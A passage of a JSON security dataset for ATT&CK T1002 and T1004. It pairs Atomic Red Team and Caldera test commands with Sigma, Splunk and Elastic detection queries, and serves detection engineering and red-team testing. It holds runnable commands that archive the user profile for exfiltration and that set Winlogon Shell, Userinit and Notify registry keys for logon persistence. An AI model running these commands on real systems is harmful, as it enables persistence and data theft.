"Compress Data for Exfiltration With PowerShell", "input_arguments": {"output_file": {"default": "$env:USERPROFILE\\data.zip", "type": "Path", "description": "Path where resulting compressed data should be placed"}, "input_file": {"default": "$env:USERPROFILE", "type": "Path", "description": "Path that should be compressed into our output file"}}, "executor": {"elevation_required": false, "command": "dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}\n", "name": "powershell", "cleanup_command": "Remove-Item -path #{output_file} -ErrorAction Ignore\n"}}, {"dependencies": [{"description": "Rar tool must be installed at specified location (#{rar_exe})\n", "get_prereq_command": "echo Downloading Winrar installer\nbitsadmin /transfer myDownloadJob /download /priority normal \"https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe\" #{rar_installer}\necho Follow the installer prompts to install Winrar\n#{rar_installer}\n", "prereq_command": "if not exist \"#{rar_exe}\" (exit /b 1)\n"}], "supported_platforms": ["windows"], "name": "Compress Data for Exfiltration With Rar", "executor": {"elevation_required": false, "command": "\"#{rar_exe}\" a -r #{output_file} #{input_path} *#{file_extension}\n", "name": "command_prompt", "cleanup_command": "del /f /q /s #{output_file} >nul 2>&1\n"}, "input_arguments": {"rar_exe": {"default": "%programfiles%/WinRAR/Rar.exe", "type": "Path", "description": "The RAR executable from Winrar"}, "file_extension": {"default": ".txt", "type": "String", "description": "Extension of files to compress"}, "output_file": {"default": "%USERPROFILE%\\data.rar", "type": "Path", "description": "Path where resulting compressed data should be placed"}, "input_path": {"default": "%USERPROFILE%", "type": "Path", "description": "Path that should be compressed into our output file"}, "rar_installer": {"default": "%TEMP%\\winrar.exe", "type": "Path", "description": "Winrar installer"}}, "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration \n"}, {"dependencies": [{"description": "Files to zip must exist (#{input_files})\n", "get_prereq_command": "echo Please set input_files argument to include files that exist\n", "prereq_command": "ls #{input_files}\n"}], "supported_platforms": ["linux", "macos"], "name": "Data Compressed - nix - zip", "executor": {"prereq_command": "ls #{input_files} > /dev/null\n", "elevation_required": false, "command": "zip #{output_file} #{input_files}\n", "cleanup_command": "rm -f #{output_file}\n", "name": "sh"}, "input_arguments": {"output_file": {"default": "$HOME/data.zip", "type": "Path", "description": "Path that should be output as a zip archive"}, "input_files": {"default": "$HOME/*.txt", "type": "Path", "description": "Path that should be compressed into our output file, may include wildcards"}}, "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard zip compression.\n"}, {"description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n", "supported_platforms": ["linux", "macos"], "name": "Data Compressed - nix - gzip Single File", "input_arguments": {"input_file": {"default": "$HOME/victim-gzip.txt", "type": "Path", "description": "Path that should be compressed"}, "input_content": {"default": "confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101", "type": "String", "description": "contents of compressed files if file does not already exist. default contains test credit card and social security number"}}, "executor": {"elevation_required": false, "command": "test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file})\n", "name": "sh", "cleanup_command": "rm -f #{input_file}.gz\n"}}, {"dependencies": [{"description": "Folder to zip must exist (#{input_file_folder})\n", "get_prereq_command": "echo Please set input_file_folder argument to a folder that exists\n", "prereq_command": "test -e #{input_file_folder}\n"}], "supported_platforms": ["linux", "macos"], "name": "Data Compressed - nix - tar Folder or File", "executor": {"elevation_required": false, "command": "tar -cvzf #{output_file} #{input_file_folder}\n", "name": "sh", "cleanup_command": "rm -f #{output_file}\n"}, "input_arguments": {"output_file": {"default": "$HOME/data.tar.gz", "type": "Path", "description": "File that should be output"}, "input_file_folder": {"default": "$HOME/$USERNAME", "type": "Path", "description": "Path that should be compressed"}}, "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n"}], "attack_technique": "T1002"}}, {"Mitre Stockpile - Compress a directory on the file system": {"platforms": {"windows": {"psh,pwsh": {"cleanup": "rm #{host.dir.staged}.zip\n", "command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "darwin": {"sh": {"cleanup": "rm #{host.dir.staged}.tar.gz\n", "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "linux": {"sh": {"cleanup": "rm #{host.dir.staged}.tar.gz\n", "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.dir.staged"}]}], "description": "Compress a directory on the file system", "tactic": "exfiltration", "technique": {"attack_id": "T1002", "name": "Data Compressed"}, "id": "300157e5-f4ad-4569-b533-9d1fa0e74d74", "name": "Compress staged directory"}}, {"Threat Hunting Tables": {"mitre_attack": "T1002", "file_value": "", "file_path": "", "parent_process": "rar.exe", "itw_sample": "", "chain_id": "100067", "registry_value": "", "mitre_caption": "data_compressed", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1002", "Empire Module": "powershell/management/zipfolder", "Technique": "Data Compressed", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/zipfolder\":  [\"T1002\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_path contains \"powershell.exe\"and process_command_line contains \"-Recurse | Compress-Archive\")or (process_path contains \"rar.exe\"and process_command_line contains \"rar*a*\")", "product": "Azure Sentinel", "name": "Data Compressed"}, {"query": "title: Data Compressed - Powershell\nid: 6dc5d284-69ea-42cf-9311-fb1c3932a69a\nstatus: experimental\ndescription: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount\n    of data sent over the network\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019/10/21\nmodified: 2019/11/04\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1002/T1002.yaml\nlogsource:\n    product: windows\n    service: powershell\n    description: 'Script block logging must be enabled'\ndetection:\n    selection:\n        EventID: 4104\n        keywords|contains|all: \n            - '-Recurse'\n            - '|'\n            - 'Compress-Archive'\n    condition: selection\nfalsepositives:\n    - highly likely if archive ops are done via PS\nlevel: low\ntags:\n    - attack.exfiltration\n    - attack.t1002", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Data Compressed - Powershell\nid: 6dc5d284-69ea-42cf-9311-fb1c3932a69a\nstatus: experimental\ndescription: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount\n    of data sent over the network\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019/10/21\nmodified: 2019/11/04\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1002/T1002.yaml\nlogsource:\n    product: windows\n    service: powershell\n    description: 'Script block logging must be enabled'\ndetection:\n    selection:\n        EventID: 4104\n        keywords|contains|all: \n            - '-Recurse'\n            - '|'\n            - 'Compress-Archive'\n    condition: selection\nfalsepositives:\n    - highly likely if archive ops are done via PS\nlevel: low\ntags:\n    - attack.exfiltration\n    - attack.t1002", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4104\" AND keywords.keyword:*\\\\-Recurse* AND keywords.keyword:*|* AND keywords.keyword:*Compress\\\\-Archive*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Data-Compressed---Powershell <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Data Compressed - Powershell\",\\n    \"description\": \"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network\",\\n    \"tags\": [\\n      \"attack.exfiltration\",\\n      \"attack.t1002\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4104\\\\\" AND keywords.keyword:*\\\\\\\\-Recurse* AND keywords.keyword:*|* AND keywords.keyword:*Compress\\\\\\\\-Archive*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4104\\\\\" AND keywords.keyword:*\\\\\\\\-Recurse* AND keywords.keyword:*|* AND keywords.keyword:*Compress\\\\\\\\-Archive*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Data Compressed - Powershell\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4104\" AND keywords.keyword:*\\\\-Recurse* AND keywords.keyword:*|* AND keywords.keyword:*Compress\\\\-Archive*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4104\" keywords=\"*-Recurse*\" keywords=\"*|*\" keywords=\"*Compress-Archive*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"4104\" keywords=\"*-Recurse*\" keywords=\"*|*\" keywords=\"*Compress-Archive*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4104)(?=.*.*-Recurse.*)(?=.*.*\\\\|.*)(?=.*.*Compress-Archive.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Data Compressed - rar.exe\nid: 6f3e2987-db24-4c78-a860-b4f4095a7095\nstatus: experimental\ndescription: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network\nauthor: Timur Zinniatullin, E.M. Anhaus, oscd.community\ndate: 2019/10/21\nmodified: 2019/11/04\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1002/T1002.yaml\n    - https://eqllib.readthedocs.io/en/latest/analytics/1ec33c93-3d0b-4a28-8014-dbdaae5c60ae.html\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\rar.exe'\n        CommandLine|contains: ' a '\n    condition: selection\nfields:\n    - Image\n    - CommandLine\n    - User\n    - LogonGuid\n    - Hashes\n    - ParentProcessGuid\n    - ParentCommandLine\nfalsepositives:\n    - highly likely if rar is default archiver in the monitored environment\nlevel: low\ntags:\n    - attack.exfiltration\n    - attack.t1002", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Data Compressed - rar.exe\nid: 6f3e2987-db24-4c78-a860-b4f4095a7095\nstatus: experimental\ndescription: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network\nauthor: Timur Zinniatullin, E.M. Anhaus, oscd.community\ndate: 2019/10/21\nmodified: 2019/11/04\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1002/T1002.yaml\n    - https://eqllib.readthedocs.io/en/latest/analytics/1ec33c93-3d0b-4a28-8014-dbdaae5c60ae.html\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\rar.exe'\n        CommandLine|contains: ' a '\n    condition: selection\nfields:\n    - Image\n    - CommandLine\n    - User\n    - LogonGuid\n    - Hashes\n    - ParentProcessGuid\n    - ParentCommandLine\nfalsepositives:\n    - highly likely if rar is default archiver in the monitored environment\nlevel: low\ntags:\n    - attack.exfiltration\n    - attack.t1002", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\rar.exe AND CommandLine.keyword:*\\\\ a\\\\ *)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Data-Compressed---rar.exe <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Data Compressed - rar.exe\",\\n    \"description\": \"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network\",\\n    \"tags\": [\\n      \"attack.exfiltration\",\\n      \"attack.t1002\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\rar.exe AND CommandLine.keyword:*\\\\\\\\ a\\\\\\\\ *)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\rar.exe AND CommandLine.keyword:*\\\\\\\\ a\\\\\\\\ *)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Data Compressed - rar.exe\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n            Image = {{_source.Image}}\\\\n      CommandLine = {{_source.CommandLine}}\\\\n             User = {{_source.User}}\\\\n        LogonGuid = {{_source.LogonGuid}}\\\\n           Hashes = {{_source.Hashes}}\\\\nParentProcessGuid = {{_source.ParentProcessGuid}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\rar.exe AND CommandLine.keyword:* a *)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\rar.exe\" CommandLine=\"* a *\") | table Image,CommandLine,User,LogonGuid,Hashes,ParentProcessGuid,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\rar.exe\" CommandLine=\"* a *\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\rar\\\\.exe)(?=.*.* a .*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Compression Tool Parameters\nid: 27a72a60-7e5e-47b1-9d17-909c9abafdcd\nstatus: experimental\ndescription: Detects suspicious command line arguments of common data compression tools\nreferences:\n    - https://twitter.com/SBousseaden/status/1184067445612535811\ntags:\n    - attack.exfiltration\n    - attack.t1020\n    - attack.t1002\nauthor: Florian Roth, Samir Bousseaden\ndate: 2019/10/15\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName:\n            - '7z*.exe'\n            - '*rar.exe'\n            - '*Command*Line*RAR*'\n        CommandLine:\n            - '* -p*'\n            - '* -ta*'\n            - '* -tb*'\n            - '* -sdel*'\n            - '* -dw*'\n            - '* -hp*'\n    falsepositive:\n        ParentImage: 'C:\\Program*'\n    condition: selection and not falsepositive\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Compression Tool Parameters\nid: 27a72a60-7e5e-47b1-9d17-909c9abafdcd\nstatus: experimental\ndescription: Detects suspicious command line arguments of common data compression tools\nreferences:\n    - https://twitter.com/SBousseaden/status/1184067445612535811\ntags:\n    - attack.exfiltration\n    - attack.t1020\n    - attack.t1002\nauthor: Florian Roth, Samir Bousseaden\ndate: 2019/10/15\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName:\n            - '7z*.exe'\n            - '*rar.exe'\n            - '*Command*Line*RAR*'\n        CommandLine:\n            - '* -p*'\n            - '* -ta*'\n            - '* -tb*'\n            - '* -sdel*'\n            - '* -dw*'\n            - '* -hp*'\n    falsepositive:\n        ParentImage: 'C:\\Program*'\n    condition: selection and not falsepositive\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((OriginalFileName.keyword:(7z*.exe OR *rar.exe OR *Command*Line*RAR*) AND CommandLine.keyword:(*\\\\ \\\\-p* OR *\\\\ \\\\-ta* OR *\\\\ \\\\-tb* OR *\\\\ \\\\-sdel* OR *\\\\ \\\\-dw* OR *\\\\ \\\\-hp*)) AND (NOT (ParentImage.keyword:C\\\\:\\\\\\\\Program*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Compression-Tool-Parameters <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Compression Tool Parameters\",\\n    \"description\": \"Detects suspicious command line arguments of common data compression tools\",\\n    \"tags\": [\\n      \"attack.exfiltration\",\\n      \"attack.t1020\",\\n      \"attack.t1002\"\\n    ],\\n    \"query\": \"((OriginalFileName.keyword:(7z*.exe OR *rar.exe OR *Command*Line*RAR*) AND CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-p* OR *\\\\\\\\ \\\\\\\\-ta* OR *\\\\\\\\ \\\\\\\\-tb* OR *\\\\\\\\ \\\\\\\\-sdel* OR *\\\\\\\\ \\\\\\\\-dw* OR *\\\\\\\\ \\\\\\\\-hp*)) AND (NOT (ParentImage.keyword:C\\\\\\\\:\\\\\\\\\\\\\\\\Program*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((OriginalFileName.keyword:(7z*.exe OR *rar.exe OR *Command*Line*RAR*) AND CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-p* OR *\\\\\\\\ \\\\\\\\-ta* OR *\\\\\\\\ \\\\\\\\-tb* OR *\\\\\\\\ \\\\\\\\-sdel* OR *\\\\\\\\ \\\\\\\\-dw* OR *\\\\\\\\ \\\\\\\\-hp*)) AND (NOT (ParentImage.keyword:C\\\\\\\\:\\\\\\\\\\\\\\\\Program*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Compression Tool Parameters\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((OriginalFileName.keyword:(7z*.exe *rar.exe *Command*Line*RAR*) AND CommandLine.keyword:(* \\\\-p* * \\\\-ta* * \\\\-tb* * \\\\-sdel* * \\\\-dw* * \\\\-hp*)) AND (NOT (ParentImage.keyword:C\\\\:\\\\\\\\Program*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((OriginalFileName=\"7z*.exe\" OR OriginalFileName=\"*rar.exe\" OR OriginalFileName=\"*Command*Line*RAR*\") (CommandLine=\"* -p*\" OR CommandLine=\"* -ta*\" OR CommandLine=\"* -tb*\" OR CommandLine=\"* -sdel*\" OR CommandLine=\"* -dw*\" OR CommandLine=\"* -hp*\")) NOT (ParentImage=\"C:\\\\\\\\Program*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (OriginalFileName IN [\"7z*.exe\", \"*rar.exe\", \"*Command*Line*RAR*\"] CommandLine IN [\"* -p*\", \"* -ta*\", \"* -tb*\", \"* -sdel*\", \"* -dw*\", \"* -hp*\"])  -(ParentImage=\"C:\\\\\\\\Program*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*(?:.*7z.*\\\\.exe|.*.*rar\\\\.exe|.*.*Command.*Line.*RAR.*))(?=.*(?:.*.* -p.*|.*.* -ta.*|.*.* -tb.*|.*.* -sdel.*|.*.* -dw.*|.*.* -hp.*))))(?=.*(?!.*(?:.*(?=.*C:\\\\Program.*)))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1004/T1004.yaml", "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force\n", "name": null}, {"source": "atomics/T1004/T1004.yaml", "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force\n", "name": null}, {"source": "atomics/T1004/T1004.yaml", "command": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" \"logon\" \"C:\\Windows\\Temp\\atomicNotificationPackage.dll\" -Force\n", "name": null}, {"source": "Threat Hunting Tables", "command": "winlogon.exe", "name": "parent_process"}, {"source": "SysmonHunter - Winlogon Helper DLL", "command": "\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell", "name": null}, {"source": "SysmonHunter - Winlogon Helper DLL", "command": "\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell", "name": null}], "command_list": ["Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force\n", "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force\n", "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" \"logon\" \"C:\\Windows\\Temp\\atomicNotificationPackage.dll\" -Force\n", "winlogon.exe", "\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell", "\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell"], "technique_id": "T1004", "parsed_datasets": [{"Atomic Red Team Test - Winlogon Helper DLL": {"display_name": "Winlogon Helper DLL", "atomic_tests": [{"description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n", "supported_platforms": ["windows"], "name": "Winlogon Shell Key Persistence - PowerShell", "input_arguments": {"binary_to_execute": {"default": "C:\\Windows\\System32\\cmd.exe", "type": "Path", "description": "Path of binary to execute"}}, "executor": {"elevation_required": false, "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, #{binary_to_execute}\" -Force\n", "name": "powershell", "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Shell\" -Force -ErrorAction Ignore\n"}}, {"description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n", "supported_platforms": ["windows"], "name": "Winlogon Userinit Key Persistence - PowerShell", "input_arguments": {"binary_to_execute": {"default": "C:\\Windows\\System32\\cmd.exe", "type": "Path", "description": "Path of binary to execute"}}, "executor": {"elevation_required": false, "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, #{binary_to_execute}\" -Force\n", "name": "powershell", "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Userinit\" -Force -ErrorAction Ignore\n"}}, {"description": "PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.\n", "supported_platforms": ["windows"], "name": "Winlogon Notify Key Logon Persistence - PowerShell", "input_arguments": {"binary_to_execute": {"default": "C:\\Windows\\Temp\\atomicNotificationPackage.dll", "type": "Path", "description": "Path of notification package to execute"}}, "executor": {"elevation_required": false, "command": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" \"logon\" \"#{binary_to_execute}\" -Force\n", "name": "powershell", "cleanup_command": "Remove-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force -ErrorAction Ignore\n"}}], "attack_technique": "T1004"}}, {"Threat Hunting Tables": {"mitre_attack": "T1004", "file_value": "", "file_path": "", "parent_process": "winlogon.exe", "itw_sample": "", "chain_id": "100087", "registry_value": "", "mitre_caption": "winlogon", "registry_path": "", "frequency": "high", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"SysmonHunter - T1004": {"phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell"}}}, {"process": {"cmdline": {"pattern": "\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell"}}, "type": "process"}], "description": null, "name": "Winlogon Helper DLL", "level": "medium"}}], "queries": [{"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14) and(registry_key_path contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\user_nameinit\\\\\"or registry_key_path contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Shell\\\\\"or registry_key_path contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Notify\\\\\")", "product": "Azure Sentinel", "name": "Win Logon Helper DLL"}, {"query": "title: Winlogon Helper DLL\nid: 851c506b-6b7c-4ce2-8802-c703009d03c0\nstatus: experimental\ndescription: Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.\n    Registry entries in HKLM\\Software[Wow6432Node]Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and 